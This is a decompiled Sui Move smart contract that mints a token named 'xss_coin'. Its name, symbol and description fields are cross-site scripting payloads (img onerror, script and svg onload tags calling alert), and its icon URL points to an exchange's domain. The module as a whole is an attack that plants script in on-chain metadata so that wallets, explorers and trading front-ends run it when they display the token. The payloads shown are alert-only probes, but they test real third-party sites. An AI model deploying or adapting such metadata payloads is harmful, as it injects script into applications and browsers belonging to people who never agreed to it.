module 0x2d20e160f0ef1c6edbc4eddbe94887cec5c2b6a23cb9f3c272c2d31095eb4053::xss_coin {
    struct XSS_COIN has drop {
        dummy_field: bool,
    }

    fun init(arg0: XSS_COIN, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1) = 0x2::coin::create_currency<XSS_COIN>(arg0, 6, b"<img/src=x onerror=alert(1)>", b"<script>alert(document.domain)</script>", b"<svg/onload=alert('XSS')>", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://app.cetus.zone")), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<XSS_COIN>>(v1);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<XSS_COIN>>(v0, 0x2::tx_context::sender(arg1));
    }

    // decompiled from Move bytecode v7
}

